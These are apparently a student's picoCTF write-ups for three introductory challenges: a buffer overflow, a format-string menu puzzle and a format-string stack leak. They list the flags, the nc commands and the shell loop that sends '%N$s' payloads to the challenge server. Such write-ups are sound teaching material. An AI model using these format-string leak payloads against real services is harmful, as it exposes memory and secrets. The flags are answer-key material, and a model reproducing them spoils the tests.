# buffer overflow 0

**Flag:** `picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}`

**Solution:**
- The main idea is to overflow the buffer using the input so that we can get the flag.
- By looking at the code, I noticed `buf2` having a character limit of 16, so the input had to have more than 16 characters, but after a few trials I noticed that it overflowed only by entering a 20+ character string, and it triggered the flag.
```
$ nc saturn.picoctf.net 55911
Input: dddddddddddddddddddd
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

**Concepts learnt:** 
1. Buffer overflow, which is when more data than a buffer can hold is assigned to it which causes this data to spill to other storage or memory areas and can crash or expose vulnerabilities.

**Mistakes & other approaches:**
- Initially, I just put a large amount of characters as the input and it still worked, but to know the exact limit, going through the code is required.

**Resources:**
- https://nordvpn.com/cybersecurity/glossary/overflow-error
# format string 0

**Flag:** `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}`

**Solution:**
- The concept to know beforehand for this challenge is *format specifiers*. 
- By launching the challenge, by the line `giant bite`, and knowing from the hint that it was related to format specifiers (which in C, are represented by `%`), I picked the `Gr%114d_Cheese` for Patrick as it was meant to have a bigger size due to `%114d` which is a format specifier to hold a 114-digit long number.
```
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
```

- Similar to last time, `Cla%sic_Che%s%steak` had multiple `%s`s which are used for strings and satisfy the requirement of a format specifier that the other options don't.
```
Gr                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
```

- Final output: 
```
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}
```

**Concepts learnt:**
- Types of format specifiers in C

**Mistakes & other approaches:**
- First, I picked the `Breakf@st_Burger` for Patrick because I didn't realise another option would have had a bigger size, which was what it asked for, until I realised the format specifiers in the food names had a role.

**Resources:**
- https://www.geeksforgeeks.org/format-specifiers-in-c/

# flag leak

**Flag:** `picoCTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}`

**Solution:**
- The challenge gave a source code and an executable file `vuln`.
- The vulnerability was present in the `printf` statement, where a format string wasn't specified. This could be exploited by entering in input such as `%x %x %x` or `%s` and the stack could be leaked. 
- To leak contents of the stack, we can dump it using a for loop that tests each position of the stack and greps for the flag. For this, I ran the command `for i in {0..30}; do echo "%$i\$s" | nc saturn.picoctf.net 50753 | grep { && echo "position: $i"; done`
```bash
CTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}
position: 24
```
The position is 24 so the flag can also be retrieved by entering `%24$s` as input where it points to the 24th member of the stack and prints it as a string.

**Concepts learnt:**
1. Vulnerabilities when a format string specifier isn't used
2. Using shell to chain commands and test each position of the stack

**Mistakes & other approaches:**
- I also tried using GDB to disassemble the file and set a breakpoint after the command where the flag is read but ran into errors while trying to execute the file.

**Resources:**
- https://owasp.org/www-community/attacks/Format_string_attack
